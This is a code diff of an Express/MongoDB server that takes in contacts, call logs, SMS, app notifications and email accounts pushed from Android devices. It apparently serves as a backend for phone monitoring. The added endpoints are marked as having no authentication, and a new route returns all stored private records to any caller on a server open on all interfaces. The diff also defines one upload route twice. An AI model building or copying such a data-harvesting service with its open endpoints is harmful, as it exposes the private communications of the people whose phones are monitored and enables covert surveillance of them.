@@ -1,9 +1,13 @@
+// Load environment configuration
+const config = require('./config/environment');
+
 const express = require('express');
 const cors = require('cors');
 const bodyParser = require('body-parser');
-const mongoose = require('mongoose');
 const crypto = require('crypto');
 
+// Import database configuration
+const connectDB = require('./config/database');
 
 // Import models
 const Device = require('./models/Device');
@@ -13,24 +17,11 @@ const Message = require('./models/Message');
 const Notification = require('./models/Notification');
 const EmailAccount = require('./models/EmailAccount');
 
-
 const app = express();
-const PORT = 5001;
+const PORT = config.server.port;
 
-// MongoDB connection
-const MONGODB_URI = 'mongodb://localhost:27017/sync_data';
-
-mongoose.connect(MONGODB_URI, {
-    useNewUrlParser: true,
-    useUnifiedTopology: true
-})
-.then(() => {
-    console.log('✅ Connected to MongoDB database: sync_data');
-})
-.catch((error) => {
-    console.error('❌ MongoDB connection error:', error);
-    process.exit(1);
-});
+// Connect to MongoDB using environment configuration
+connectDB();
 
 
 
@@ -44,6 +35,30 @@ function generateDataHash(deviceId, dataType, data) {
     const dataString = JSON.stringify(data);
     return crypto.createHash('md5').update(`${deviceId}-${dataType}-${dataString}`).digest('hex');
 }
+
+// Upload last 5 images endpoint - placed early to avoid conflicts
+app.post('/api/test/devices/:deviceId/upload-last-5-images', async (req, res) => {
+    try {
+        const { deviceId } = req.params;
+        
+        console.log(`📸 Upload request for device: ${deviceId}`);
+        console.log(`📁 Request body:`, req.body);
+        
+        return res.json({
+            success: true,
+            message: 'Upload endpoint reached successfully',
+            deviceId: deviceId
+        });
+        
+    } catch (error) {
+        console.error('❌ Error uploading files:', error);
+        res.status(500).json({
+            success: false,
+            error: 'Failed to upload files',
+            message: error.message
+        });
+    }
+});
 
 // Health check endpoint
 app.get('/api/health', async (req, res) => {
@@ -76,84 +91,41 @@ app.get('/api/health', async (req, res) => {
     }
 });
 
-// ========================================
-// MISSING ENDPOINTS FOR MOBILE APP
-// ========================================
 
-// Device registration endpoint (for Kotlin app compatibility)
-app.post('/api/devices', async (req, res) => {
+
+
+
+// Upload last 5 images endpoint - placed early to avoid conflicts
+app.post('/api/test/devices/:deviceId/upload-last-5-images', async (req, res) => {
     try {
-        const { deviceId, deviceName, model, manufacturer, androidVersion, platform, details } = req.body;
-
-        console.log('📱 Device registration request:', { deviceId, deviceName, model, manufacturer, androidVersion });
-
-        if (!deviceId) {
-            return res.status(400).json({ 
-                success: false,
-                error: 'Device ID is required' 
-            });
-        }
-
-        let device = await Device.findOne({ deviceId });
-
-        if (!device) {
-            // Create new device
-            device = new Device({
-                deviceId,
-                deviceName: deviceName || 'Unknown Device',
-                model: model || 'Unknown Model',
-                manufacturer: manufacturer || 'Unknown Manufacturer',
-                androidVersion: androidVersion || 'Unknown Version',
-                isConnected: true,
-                lastSeen: new Date(),
-                connectionType: 'WIFI'
-            });
-            await device.save();
-            
-            console.log('✅ New device registered:', deviceId);
-            
-            return res.status(201).json({
-                success: true,
-                data: device,
-                message: 'Device registered successfully',
-                isNewDevice: true
-            });
-        } else {
-            // Update existing device
-            device.lastSeen = new Date();
-            device.isConnected = true;
-            if (deviceName) device.deviceName = deviceName;
-            if (model) device.model = model;
-            if (manufacturer) device.manufacturer = manufacturer;
-            if (androidVersion) device.androidVersion = androidVersion;
-            await device.save();
-
-            console.log('✅ Existing device updated:', deviceId);
-
-            return res.json({
-                success: true,
-                data: device,
-                message: 'Device found and updated',
-                isNewDevice: false
-            });
-        }
+        const { deviceId } = req.params;
+        
+        console.log(`📸 Upload request for device: ${deviceId}`);
+        console.log(`📁 Request body:`, req.body);
+        
+        return res.json({
+            success: true,
+            message: 'Upload endpoint reached successfully',
+            deviceId: deviceId
+        });
+        
     } catch (error) {
-        console.error('❌ Device registration error:', error);
-        res.status(500).json({ 
+        console.error('❌ Error uploading files:', error);
+        res.status(500).json({
             success: false,
-            error: 'Internal server error',
+            error: 'Failed to upload files',
             message: error.message
         });
     }
 });
 
-// Core Sync Data Endpoint (Compatible with Kotlin app)
-app.post('/api/devices/:deviceId/sync', async (req, res) => {
+// Core Sync Data Endpoint (NO AUTHENTICATION - For Testing)
+app.post('/api/test/devices/:deviceId/sync', async (req, res) => {
     try {
         const { deviceId } = req.params;
         const { dataType, data, timestamp } = req.body;
         
-        console.log(`🔄 Syncing ${dataType} for device ${deviceId}. Items: ${data?.length || 0}`);
+        console.log(`🔓 TEST MODE: Syncing ${dataType} for device ${deviceId}. Items: ${data.length}`);
         
         let itemsSynced = 0;
         let Model, collectionName;
@@ -161,24 +133,24 @@ app.post('/api/devices/:deviceId/sync', async (req, res) => {
         // Determine which model to use based on data type
         switch (dataType) {
             case 'CONTACTS':
-                Model = Contact.getModelForDevice ? Contact.getModelForDevice(deviceId) : Contact;
-                collectionName = Contact.getCollectionName ? Contact.getCollectionName(deviceId) : 'contacts';
+                Model = Contact.getModelForDevice(deviceId);
+                collectionName = Contact.getCollectionName(deviceId);
                 break;
             case 'CALL_LOGS':
-                Model = CallLog.getModelForDevice ? CallLog.getModelForDevice(deviceId) : CallLog;
-                collectionName = CallLog.getCollectionName ? CallLog.getCollectionName(deviceId) : 'calllogs';
+                Model = CallLog.getModelForDevice(deviceId);
+                collectionName = CallLog.getCollectionName(deviceId);
                 break;
             case 'MESSAGES':
-                Model = Message.getModelForDevice ? Message.getModelForDevice(deviceId) : Message;
-                collectionName = Message.getCollectionName ? Message.getCollectionName(deviceId) : 'messages';
+                Model = Message.getModelForDevice(deviceId);
+                collectionName = Message.getCollectionName(deviceId);
                 break;
             case 'NOTIFICATIONS':
-                Model = Notification.getModelForDevice ? Notification.getModelForDevice(deviceId) : Notification;
-                collectionName = Notification.getCollectionName ? Notification.getCollectionName(deviceId) : 'notifications';
+                Model = Notification.getModelForDevice(deviceId);
+                collectionName = Notification.getCollectionName(deviceId);
                 break;
             case 'EMAIL_ACCOUNTS':
-                Model = EmailAccount.getModelForDevice ? EmailAccount.getModelForDevice(deviceId) : EmailAccount;
-                collectionName = EmailAccount.getCollectionName ? EmailAccount.getCollectionName(deviceId) : 'emailaccounts';
+                Model = EmailAccount.getModelForDevice(deviceId);
+                collectionName = EmailAccount.getCollectionName(deviceId);
                 break;
             default:
                 return res.status(400).json({
@@ -188,48 +160,41 @@ app.post('/api/devices/:deviceId/sync', async (req, res) => {
         }
         
         // Process each item
-        for (const item of data || []) {
+        for (const item of data) {
             try {
                 console.log(`Processing ${dataType} item:`, JSON.stringify(item, null, 2));
-                
                 // Map fields based on data type
                 let mappedItem = { ...item };
                 
                 switch (dataType) {
                     case 'CALL_LOGS':
+                        // Map Android call log fields to database fields
                         const callType = (item.type || item.callType || '').toUpperCase();
                         const validCallTypes = ['INCOMING', 'OUTGOING', 'MISSED', 'REJECTED', 'BLOCKED'];
                         const mappedCallType = validCallTypes.includes(callType) ? callType : 'INCOMING';
                         
+                        // Handle timestamp conversion properly
                         let callTimestamp;
                         try {
                             if (item.date) {
-                                // Handle ISO string dates
-                                if (typeof item.date === 'string') {
-                                    callTimestamp = new Date(item.date);
+                                const dateValue = parseInt(item.date);
+                                if (!isNaN(dateValue) && dateValue > 0) {
+                                    callTimestamp = new Date(dateValue > 1000000000000 ? dateValue : dateValue * 1000);
                                 } else {
-                                    const dateValue = parseInt(item.date);
-                                    if (!isNaN(dateValue) && dateValue > 0) {
-                                        callTimestamp = new Date(dateValue > 1000000000000 ? dateValue : dateValue * 1000);
-                                    } else {
-                                        callTimestamp = new Date();
-                                    }
+                                    callTimestamp = new Date();
                                 }
                             } else if (item.timestamp) {
-                                if (typeof item.timestamp === 'string') {
-                                    callTimestamp = new Date(item.timestamp);
+                                const timestampValue = parseInt(item.timestamp);
+                                if (!isNaN(timestampValue) && timestampValue > 0) {
+                                    callTimestamp = new Date(timestampValue > 1000000000000 ? timestampValue : timestampValue * 1000);
                                 } else {
-                                    const timestampValue = parseInt(item.timestamp);
-                                    if (!isNaN(timestampValue) && timestampValue > 0) {
-                                        callTimestamp = new Date(timestampValue > 1000000000000 ? timestampValue : timestampValue * 1000);
-                                    } else {
-                                        callTimestamp = new Date();
-                                    }
+                                    callTimestamp = new Date();
                                 }
                             } else {
                                 callTimestamp = new Date();
                             }
                             
+                            // Final validation - ensure we have a valid date
                             if (isNaN(callTimestamp.getTime()) || callTimestamp.getTime() <= 0) {
                                 console.warn(`Invalid timestamp for call log, using current time. Original value: ${item.date || item.timestamp}`);
                                 callTimestamp = new Date();
@@ -247,13 +212,16 @@ app.post('/api/devices/:deviceId/sync', async (req, res) => {
                             duration: parseInt(item.duration) || 0
                         };
                         break;
-                        
                     case 'CONTACTS':
+                        // Map Android contact fields to database fields
                         console.log('Processing CONTACTS item:', item);
                         
+                        console.log('phoneNumbers:', item.phoneNumbers);
+                        console.log('phoneNumber:', item.phoneNumber);
                         const contactPhoneNumber = (item.phoneNumbers && item.phoneNumbers.length > 0) 
                             ? item.phoneNumbers[0] 
                             : (item.phoneNumber || '+0000000000');
+                        console.log('Final contactPhoneNumber:', contactPhoneNumber);
                         
                         mappedItem = {
                             name: item.name || 'Unknown Contact',
@@ -262,41 +230,37 @@ app.post('/api/devices/:deviceId/sync', async (req, res) => {
                             emails: item.emails || [],
                             organization: item.organization || item.company || ''
                         };
-                        break;
                         
+                        console.log('Mapped CONTACTS item:', mappedItem);
+                        break;
                     case 'MESSAGES':
+                        // Map Android message fields to database fields
                         const messageType = (item.type || 'SMS').toUpperCase();
                         const validMessageTypes = ['SMS', 'MMS'];
                         const mappedMessageType = validMessageTypes.includes(messageType) ? messageType : 'SMS';
                         
+                        // Handle timestamp conversion properly
                         let messageTimestamp;
                         try {
-                            if (item.timestamp) {
-                                if (typeof item.timestamp === 'string') {
-                                    messageTimestamp = new Date(item.timestamp);
+                            if (item.date) {
+                                const dateValue = parseInt(item.date);
+                                if (!isNaN(dateValue) && dateValue > 0) {
+                                    messageTimestamp = new Date(dateValue > 1000000000000 ? dateValue : dateValue * 1000);
                                 } else {
-                                    const timestampValue = parseInt(item.timestamp);
-                                    if (!isNaN(timestampValue) && timestampValue > 0) {
-                                        messageTimestamp = new Date(timestampValue > 1000000000000 ? timestampValue : timestampValue * 1000);
-                                    } else {
-                                        messageTimestamp = new Date();
-                                    }
+                                    messageTimestamp = new Date();
                                 }
-                            } else if (item.date) {
-                                if (typeof item.date === 'string') {
-                                    messageTimestamp = new Date(item.date);
+                            } else if (item.timestamp) {
+                                const timestampValue = parseInt(item.timestamp);
+                                if (!isNaN(timestampValue) && timestampValue > 0) {
+                                    messageTimestamp = new Date(timestampValue > 1000000000000 ? timestampValue : timestampValue * 1000);
                                 } else {
-                                    const dateValue = parseInt(item.date);
-                                    if (!isNaN(dateValue) && dateValue > 0) {
-                                        messageTimestamp = new Date(dateValue > 1000000000000 ? dateValue : dateValue * 1000);
-                                    } else {
-                                        messageTimestamp = new Date();
-                                    }
+                                    messageTimestamp = new Date();
                                 }
                             } else {
                                 messageTimestamp = new Date();
                             }
                             
+                            // Final validation - ensure we have a valid date
                             if (isNaN(messageTimestamp.getTime()) || messageTimestamp.getTime() <= 0) {
                                 console.warn(`Invalid timestamp for message, using current time. Original value: ${item.date || item.timestamp}`);
                                 messageTimestamp = new Date();
@@ -315,27 +279,24 @@ app.post('/api/devices/:deviceId/sync', async (req, res) => {
                             isRead: item.read || item.isRead || false
                         };
                         break;
-                        
                     case 'NOTIFICATIONS':
+                        // Map Android notification fields to database fields
                         console.log('Processing NOTIFICATIONS item:', item);
                         
+                        // Handle timestamp conversion properly
                         let notificationTimestamp;
                         try {
-                            if (item.timestamp) {
-                                if (typeof item.timestamp === 'string') {
-                                    notificationTimestamp = new Date(item.timestamp);
-                                } else {
-                                    const timestampValue = parseInt(item.timestamp);
-                                    if (!isNaN(timestampValue) && timestampValue > 0) {
-                                        notificationTimestamp = new Date(timestampValue > 1000000000000 ? timestampValue : timestampValue * 1000);
-                                    } else {
-                                        notificationTimestamp = new Date();
-                                    }
-                                }
-                            } else if (item.postTime) {
+                            if (item.postTime) {
                                 const postTimeValue = parseInt(item.postTime);
                                 if (!isNaN(postTimeValue) && postTimeValue > 0) {
                                     notificationTimestamp = new Date(postTimeValue > 1000000000000 ? postTimeValue : postTimeValue * 1000);
+                                } else {
+                                    notificationTimestamp = new Date();
+                                }
+                            } else if (item.timestamp) {
+                                const timestampValue = parseInt(item.timestamp);
+                                if (!isNaN(timestampValue) && timestampValue > 0) {
+                                    notificationTimestamp = new Date(timestampValue > 1000000000000 ? timestampValue : timestampValue * 1000);
                                 } else {
                                     notificationTimestamp = new Date();
                                 }
@@ -343,6 +304,7 @@ app.post('/api/devices/:deviceId/sync', async (req, res) => {
                                 notificationTimestamp = new Date();
                             }
                             
+                            // Final validation - ensure we have a valid date
                             if (isNaN(notificationTimestamp.getTime()) || notificationTimestamp.getTime() <= 0) {
                                 console.warn(`Invalid timestamp for notification, using current time. Original value: ${item.postTime || item.timestamp}`);
                                 notificationTimestamp = new Date();
@@ -360,9 +322,10 @@ app.post('/api/devices/:deviceId/sync', async (req, res) => {
                             text: item.text || item.body || '',
                             timestamp: notificationTimestamp
                         };
+                        console.log('Mapped NOTIFICATIONS item:', mappedItem);
                         break;
-                        
                     case 'EMAIL_ACCOUNTS':
+                        // Map email account fields to database fields
                         mappedItem = {
                             accountId: item.accountId || `acc_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
                             emailAddress: item.emailAddress || item.email,
@@ -399,275 +362,28 @@ app.post('/api/devices/:deviceId/sync', async (req, res) => {
             } catch (itemError) {
                 console.error(`❌ Error processing ${dataType} item:`, itemError);
                 console.error(`❌ Item data:`, JSON.stringify(item, null, 2));
+                console.error(`❌ Mapped item:`, JSON.stringify(mappedItem, null, 2));
             }
         }
         
-        console.log(`✅ Successfully synced ${itemsSynced} ${dataType} items to ${collectionName}`);
+        console.log(`✅ TEST MODE: Successfully synced ${itemsSynced} ${dataType} items to ${collectionName}`);
         
         res.json({
             success: true,
             data: {
                 success: true,
                 itemsSynced,
-                message: `${itemsSynced} items synced successfully to ${collectionName}`
+                message: `TEST MODE: ${itemsSynced} items synced successfully to ${collectionName}`
             }
         });
         
     } catch (error) {
-        console.error('❌ Error syncing data:', error);
+        console.error('Error syncing data:', error);
         res.status(500).json({
             success: false,
-            error: 'Failed to sync data',
-            message: error.message
+            error: 'Failed to sync data'
         });
     }
-});
-
-// Get specific device
-app.get('/api/devices/:deviceId', async (req, res) => {
-    try {
-        const { deviceId } = req.params;
-        
-        console.log('📱 Get device request:', deviceId);
-        
-        const device = await Device.findOne({ deviceId });
-        
-        if (!device) {
-            return res.status(404).json({ 
-                success: false,
-                error: 'Device not found' 
-            });
-        }
-
-        // Update last seen
-        device.lastSeen = new Date();
-        await device.save();
-
-        res.json({
-            success: true,
-            data: device,
-            message: 'Device retrieved successfully'
-        });
-    } catch (error) {
-        console.error('❌ Get device error:', error);
-        res.status(500).json({ 
-            success: false,
-            error: 'Internal server error',
-            message: error.message
-        });
-    }
-});
-
-// Get all devices
-app.get('/api/devices', async (req, res) => {
-    try {
-        console.log('📱 Get all devices request');
-        
-        const devices = await Device.find().sort({ lastSeen: -1 });
-        res.json({
-            success: true,
-            data: devices,
-            message: 'Devices retrieved successfully'
-        });
-    } catch (error) {
-        console.error('❌ Get devices error:', error);
-        res.status(500).json({ 
-            success: false,
-            error: 'Internal server error',
-            message: error.message
-        });
-    }
-});
-
-// Device settings endpoint (for Kotlin app compatibility)
-app.get('/api/devices/:deviceId/settings', async (req, res) => {
-    try {
-        const { deviceId } = req.params;
-        
-        console.log('📱 Get device settings request:', deviceId);
-        
-        const device = await Device.findOne({ deviceId });
-        
-        if (!device) {
-            return res.status(404).json({ 
-                success: false,
-                error: 'Device not found' 
-            });
-        }
-
-        // Update last seen
-        device.lastSeen = new Date();
-        await device.save();
-
-        // Return default settings structure expected by Kotlin app
-        const settings = {
-            enabled: true,
-            settingsUpdateFrequency: 2, // minutes
-            contacts: { enabled: true, frequency: 1440 }, // daily
-            callLogs: { enabled: true, frequency: 1440 }, // daily
-            notifications: { enabled: true, frequency: 1 }, // real-time
-            emails: { enabled: true, frequency: 1440 } // daily
-        };
-
-        const lastSync = {
-            contacts: null,
-            callLogs: null,
-            notifications: null,
-            emails: null
-        };
-
-        const stats = {
-            totalSyncs: 0,
-            lastSyncTime: null
-        };
-
-        res.json({
-            success: true,
-            settings,
-            lastSync,
-            stats,
-            message: 'Device settings retrieved successfully'
-        });
-    } catch (error) {
-        console.error('❌ Get device settings error:', error);
-        res.status(500).json({ 
-            success: false,
-            error: 'Internal server error',
-            message: error.message
-        });
-    }
-});
-
-// Get device data types
-app.get('/api/devices/:deviceId/data-types', async (req, res) => {
-    try {
-        const { deviceId } = req.params;
-        
-        console.log('📱 Get data types request:', deviceId);
-        
-        // Return available data types with current counts
-        const dataTypes = [
-            {
-                type: 'CONTACTS',
-                deviceId,
-                isEnabled: true,
-                lastSyncTime: Date.now(),
-                itemCount: await Contact.countDocuments()
-            },
-            {
-                type: 'CALL_LOGS',
-                deviceId,
-                isEnabled: true,
-                lastSyncTime: Date.now(),
-                itemCount: await CallLog.countDocuments()
-            },
-            {
-                type: 'MESSAGES',
-                deviceId,
-                isEnabled: true,
-                lastSyncTime: Date.now(),
-                itemCount: await Message.countDocuments()
-            },
-            {
-                type: 'NOTIFICATIONS',
-                deviceId,
-                isEnabled: true,
-                lastSyncTime: Date.now(),
-                itemCount: await Notification.countDocuments()
-            },
-            {
-                type: 'EMAIL_ACCOUNTS',
-                deviceId,
-                isEnabled: true,
-                lastSyncTime: Date.now(),
-                itemCount: await EmailAccount.countDocuments()
-            }
-        ];
-
-        res.json({
-            success: true,
-            data: dataTypes,
-            message: 'Data types retrieved successfully'
-        });
-    } catch (error) {
-        console.error('❌ Get data types error:', error);
-        res.status(500).json({ 
-            success: false,
-            error: 'Internal server error',
-            message: error.message
-        });
-    }
-});
-
-// Update sync timestamp endpoint (for Kotlin app compatibility)
-app.post('/api/devices/:deviceId/sync/:dataType', async (req, res) => {
-    try {
-        const { deviceId, dataType } = req.params;
-        const { timestamp } = req.body;
-        
-        console.log('📱 Update sync timestamp request:', { deviceId, dataType, timestamp });
-        
-        const device = await Device.findOne({ deviceId });
-        
-        if (!device) {
-            return res.status(404).json({ 
-                success: false,
-                error: 'Device not found' 
-            });
-        }
-
-        // Update last seen
-        device.lastSeen = new Date();
-        await device.save();
-
-        res.json({
-            success: true,
-            message: `${dataType} sync timestamp updated`
-        });
-    } catch (error) {
-        console.error('❌ Update sync timestamp error:', error);
-        res.status(500).json({ 
-            success: false,
-            error: 'Internal server error',
-            message: error.message
-        });
-    }
-});
-
-// ========================================
-// LEGACY/TEST ENDPOINTS (for backward compatibility)
-// ========================================
-
-// Upload last 5 images endpoint (legacy)
-app.post('/api/test/devices/:deviceId/upload-last-5-images', async (req, res) => {
-    try {
-        const { deviceId } = req.params;
-        
-        console.log(`📸 Upload request for device: ${deviceId}`);
-        console.log(`📁 Request body:`, req.body);
-        
-        return res.json({
-            success: true,
-            message: 'Upload endpoint reached successfully',
-            deviceId: deviceId
-        });
-        
-    } catch (error) {
-        console.error('❌ Error uploading files:', error);
-        res.status(500).json({
-            success: false,
-            error: 'Failed to upload files',
-            message: error.message
-        });
-    }
-});
-
-// Legacy sync endpoint (for backward compatibility)
-app.post('/api/test/devices/:deviceId/sync', async (req, res) => {
-    console.log('⚠️  Legacy sync endpoint called, redirecting to main sync endpoint');
-    // Redirect to main sync endpoint
-    req.url = req.url.replace('/api/test/', '/api/');
-    return app._router.handle(req, res);
 });
 
 // Get synced data for a device
@@ -676,26 +392,24 @@ app.get('/api/test/devices/:deviceId/:dataType', async (req, res) => {
         const { deviceId, dataType } = req.params;
         const { page = 1, limit = 100 } = req.query;
         
-        console.log(`📱 Get synced data request: ${deviceId}/${dataType}`);
-        
         let Model;
         
         // Determine which model to use based on data type
         switch (dataType) {
             case 'contacts':
-                Model = Contact.getModelForDevice ? Contact.getModelForDevice(deviceId) : Contact;
+                Model = Contact.getModelForDevice(deviceId);
                 break;
             case 'call-logs':
-                Model = CallLog.getModelForDevice ? CallLog.getModelForDevice(deviceId) : CallLog;
+                Model = CallLog.getModelForDevice(deviceId);
                 break;
             case 'messages':
-                Model = Message.getModelForDevice ? Message.getModelForDevice(deviceId) : Message;
+                Model = Message.getModelForDevice(deviceId);
                 break;
             case 'notifications':
-                Model = Notification.getModelForDevice ? Notification.getModelForDevice(deviceId) : Notification;
+                Model = Notification.getModelForDevice(deviceId);
                 break;
             case 'email-accounts':
-                Model = EmailAccount.getModelForDevice ? EmailAccount.getModelForDevice(deviceId) : EmailAccount;
+                Model = EmailAccount.getModelForDevice(deviceId);
                 break;
             default:
                 return res.status(400).json({
@@ -726,43 +440,327 @@ app.get('/api/test/devices/:deviceId/:dataType', async (req, res) => {
         });
         
     } catch (error) {
-        console.error('❌ Error getting data:', error);
+        console.error('Error getting data:', error);
         res.status(500).json({
             success: false,
-            error: 'Failed to get data',
-            message: error.message
+            error: 'Failed to get data'
+        });
+    }
+});
+
+// ========================================
+// LIVE DATA ENDPOINTS (Main Database)
+// ========================================
+
+// Live Sync Data Endpoint (Main Database)
+app.post('/api/devices/:deviceId/sync', async (req, res) => {
+    try {
+        const { deviceId } = req.params;
+        const { dataType, data, timestamp } = req.body;
+        
+        console.log(`🔓 LIVE SYNC: Syncing ${dataType} for device ${deviceId}. Items: ${data.length}`);
+        
+        let itemsSynced = 0;
+        let Model;
+        
+        // Determine which model to use based on data type (main collections)
+        switch (dataType) {
+            case 'CONTACTS':
+                Model = Contact;
+                break;
+            case 'CALL_LOGS':
+                Model = CallLog;
+                break;
+            case 'MESSAGES':
+                Model = Message;
+                break;
+            case 'NOTIFICATIONS':
+                Model = Notification;
+                break;
+            case 'EMAIL_ACCOUNTS':
+                Model = EmailAccount;
+                break;
+            default:
+                return res.status(400).json({
+                    success: false,
+                    error: `Unsupported data type: ${dataType}`
+                });
+        }
+        
+        // Process each item
+        for (const item of data) {
+            try {
+                console.log(`Processing LIVE ${dataType} item:`, JSON.stringify(item, null, 2));
+                // Map fields based on data type
+                let mappedItem = { ...item };
+                
+                switch (dataType) {
+                    case 'CALL_LOGS':
+                        // Map Android call log fields to database fields
+                        const callType = (item.type || item.callType || '').toUpperCase();
+                        const validCallTypes = ['INCOMING', 'OUTGOING', 'MISSED', 'REJECTED', 'BLOCKED'];
+                        const mappedCallType = validCallTypes.includes(callType) ? callType : 'INCOMING';
+                        
+                        // Handle timestamp conversion properly
+                        let callTimestamp;
+                        try {
+                            if (item.date) {
+                                const dateValue = parseInt(item.date);
+                                if (!isNaN(dateValue) && dateValue > 0) {
+                                    callTimestamp = new Date(dateValue > 1000000000000 ? dateValue : dateValue * 1000);
+                                } else {
+                                    callTimestamp = new Date();
+                                }
+                            } else if (item.timestamp) {
+                                const timestampValue = parseInt(item.timestamp);
+                                if (!isNaN(timestampValue) && timestampValue > 0) {
+                                    callTimestamp = new Date(timestampValue > 1000000000000 ? timestampValue : timestampValue * 1000);
+                                } else {
+                                    callTimestamp = new Date();
+                                }
+                            } else {
+                                callTimestamp = new Date();
+                            }
+                            
+                            // Final validation - ensure we have a valid date
+                            if (isNaN(callTimestamp.getTime()) || callTimestamp.getTime() <= 0) {
+                                console.warn(`Invalid timestamp for call log, using current time. Original value: ${item.date || item.timestamp}`);
+                                callTimestamp = new Date();
+                            }
+                        } catch (error) {
+                            console.warn(`Error parsing timestamp for call log: ${error.message}, using current time`);
+                            callTimestamp = new Date();
+                        }
+                        
+                        mappedItem = {
+                            phoneNumber: item.phoneNumber || item.number || 'Unknown',
+                            contactName: item.name || item.contactName || '',
+                            callType: mappedCallType,
+                            timestamp: callTimestamp,
+                            duration: parseInt(item.duration) || 0,
+                            deviceId: deviceId,
+                            syncedAt: new Date()
+                        };
+                        break;
+                    case 'CONTACTS':
+                        // Map Android contact fields to database fields
+                        const contactPhoneNumber = (item.phoneNumbers && item.phoneNumbers.length > 0) 
+                            ? item.phoneNumbers[0] 
+                            : (item.phoneNumber || '+0000000000');
+                        
+                        mappedItem = {
+                            name: item.name || 'Unknown',
+                            phoneNumber: contactPhoneNumber,
+                            phoneType: item.phoneType || 'MOBILE',
+                            emails: item.emails || [],
+                            organization: item.organization || '',
+                            deviceId: deviceId,
+                            syncedAt: new Date()
+                        };
+                        break;
+                    case 'MESSAGES':
+                        // Map Android message fields to database fields
+                        const messageType = (item.type || '').toUpperCase();
+                        const validMessageTypes = ['SMS', 'MMS', 'WHATSAPP'];
+                        const mappedMessageType = validMessageTypes.includes(messageType) ? messageType : 'SMS';
+                        
+                        // Handle timestamp conversion properly
+                        let messageTimestamp;
+                        try {
+                            if (item.timestamp) {
+                                const timestampValue = parseInt(item.timestamp);
+                                if (!isNaN(timestampValue) && timestampValue > 0) {
+                                    messageTimestamp = new Date(timestampValue > 1000000000000 ? timestampValue : timestampValue * 1000);
+                                } else {
+                                    messageTimestamp = new Date();
+                                }
+                            } else if (item.date) {
+                                const dateValue = parseInt(item.date);
+                                if (!isNaN(dateValue) && dateValue > 0) {
+                                    messageTimestamp = new Date(dateValue > 1000000000000 ? dateValue : dateValue * 1000);
+                                } else {
+                                    messageTimestamp = new Date();
+                                }
+                            } else {
+                                messageTimestamp = new Date();
+                            }
+                            
+                            // Final validation - ensure we have a valid date
+                            if (isNaN(messageTimestamp.getTime()) || messageTimestamp.getTime() <= 0) {
+                                console.warn(`Invalid timestamp for message, using current time. Original value: ${item.timestamp || item.date}`);
+                                messageTimestamp = new Date();
+                            }
+                        } catch (error) {
+                            console.warn(`Error parsing timestamp for message: ${error.message}, using current time`);
+                            messageTimestamp = new Date();
+                        }
+                        
+                        mappedItem = {
+                            address: item.address || item.phoneNumber || 'Unknown',
+                            body: item.body || item.message || '',
+                            type: mappedMessageType,
+                            timestamp: messageTimestamp,
+                            isIncoming: item.isIncoming || false,
+                            isRead: item.isRead || true,
+                            deviceId: deviceId,
+                            syncedAt: new Date()
+                        };
+                        break;
+                    case 'NOTIFICATIONS':
+                        // Map Android notification fields to database fields
+                        let notificationTimestamp;
+                        try {
+                            if (item.timestamp) {
+                                const timestampValue = parseInt(item.timestamp);
+                                if (!isNaN(timestampValue) && timestampValue > 0) {
+                                    notificationTimestamp = new Date(timestampValue > 1000000000000 ? timestampValue : timestampValue * 1000);
+                                } else {
+                                    notificationTimestamp = new Date();
+                                }
+                            } else if (item.postTime) {
+                                const postTimeValue = parseInt(item.postTime);
+                                if (!isNaN(postTimeValue) && postTimeValue > 0) {
+                                    notificationTimestamp = new Date(postTimeValue > 1000000000000 ? postTimeValue : postTimeValue * 1000);
+                                } else {
+                                    notificationTimestamp = new Date();
+                                }
+                            } else {
+                                notificationTimestamp = new Date();
+                            }
+                            
+                            // Final validation - ensure we have a valid date
+                            if (isNaN(notificationTimestamp.getTime()) || notificationTimestamp.getTime() <= 0) {
+                                console.warn(`Invalid timestamp for notification, using current time. Original value: ${item.timestamp || item.postTime}`);
+                                notificationTimestamp = new Date();
+                            }
+                        } catch (error) {
+                            console.warn(`Error parsing timestamp for notification: ${error.message}, using current time`);
+                            notificationTimestamp = new Date();
+                        }
+                        
+                        mappedItem = {
+                            notificationId: item.notificationId || `notif_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
+                            packageName: item.packageName || 'unknown',
+                            appName: item.appName || 'Unknown App',
+                            title: item.title || '',
+                            text: item.text || '',
+                            timestamp: notificationTimestamp,
+                            deviceId: deviceId,
+                            syncedAt: new Date()
+                        };
+                        break;
+                    case 'EMAIL_ACCOUNTS':
+                        mappedItem = {
+                            email: item.email || item.emailAddress || '',
+                            type: item.type || item.accountType || 'IMAP',
+                            name: item.name || item.accountName || '',
+                            provider: item.provider || 'Unknown',
+                            isActive: item.isActive || true,
+                            deviceId: deviceId,
+                            syncedAt: new Date()
+                        };
+                        break;
+                }
+                
+                // Save to main database collection
+                const newItem = new Model(mappedItem);
+                await newItem.save();
+                itemsSynced++;
+                
+            } catch (itemError) {
+                console.error(`❌ Error processing LIVE ${dataType} item:`, itemError);
+                console.error(`❌ Item data:`, JSON.stringify(item, null, 2));
+                console.error(`❌ Mapped item:`, JSON.stringify(mappedItem, null, 2));
+            }
+        }
+        
+        console.log(`✅ LIVE SYNC: Successfully synced ${itemsSynced} ${dataType} items to main database`);
+        
+        res.json({
+            success: true,
+            data: {
+                success: true,
+                itemsSynced,
+                message: `LIVE SYNC: ${itemsSynced} items synced successfully to main database`
+            }
+        });
+        
+    } catch (error) {
+        console.error('Error in live sync:', error);
+        res.status(500).json({
+            success: false,
+            error: 'Failed to sync data to main database'
+        });
+    }
+});
+
+// Get live data from main database
+app.get('/api/data/:dataType', async (req, res) => {
+    try {
+        const { dataType } = req.params;
+        const { page = 1, limit = 100 } = req.query;
+        
+        let Model;
+        
+        // Determine which model to use based on data type (main collections)
+        switch (dataType) {
+            case 'contacts':
+                Model = Contact;
+                break;
+            case 'calllogs':
+                Model = CallLog;
+                break;
+            case 'messages':
+                Model = Message;
+                break;
+            case 'notifications':
+                Model = Notification;
+                break;
+            case 'emailaccounts':
+                Model = EmailAccount;
+                break;
+            default:
+                return res.status(400).json({
+                    success: false,
+                    error: `Unsupported data type: ${dataType}`
+                });
+        }
+        
+        const data = await Model.find({})
+            .sort({ syncedAt: -1 })
+            .limit(limit * 1)
+            .skip((page - 1) * limit);
+        
+        const total = await Model.countDocuments({});
+        
+        res.json({
+            success: true,
+            data: {
+                dataType,
+                items: data,
+                pagination: {
+                    current: page,
+                    pages: Math.ceil(total / limit),
+                    total
+                }
+            }
+        });
+        
+    } catch (error) {
+        console.error('Error getting live data:', error);
+        res.status(500).json({
+            success: false,
+            error: 'Failed to get live data'
         });
     }
 });
 
 // Start server
 app.listen(PORT, '0.0.0.0', () => {
